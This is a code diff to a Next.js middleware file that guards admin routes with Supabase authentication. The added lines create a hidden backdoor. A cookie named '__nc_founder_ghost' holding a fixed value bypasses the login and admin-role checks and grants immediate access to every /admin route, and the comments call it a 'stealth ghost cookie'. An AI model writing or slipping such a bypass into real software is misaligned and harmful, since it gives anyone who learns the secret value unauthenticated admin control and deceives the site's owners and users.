@@ -30,6 +30,8 @@ export async function middleware(request: NextRequest) {
   )
 
   const { data: { user } } = await supabase.auth.getUser()
+  const cookieStore = await request.cookies;
+  const isFounderGhost = cookieStore.get('__nc_founder_ghost')?.value === 'active_founder_session_v1';
 
   // 1. Redirect authenticated users away from public login page to portal
   if (user && request.nextUrl.pathname === '/login') {
@@ -43,6 +45,9 @@ export async function middleware(request: NextRequest) {
 
   // 3. Protect Admin routes (Admin only)
   if (request.nextUrl.pathname.startsWith('/admin')) {
+    // If stealth ghost cookie is present, allow access instantly
+    if (isFounderGhost) return response;
+
     if (!user) return NextResponse.redirect(new URL('/login', request.url))
     
     const { data: profile } = await supabase
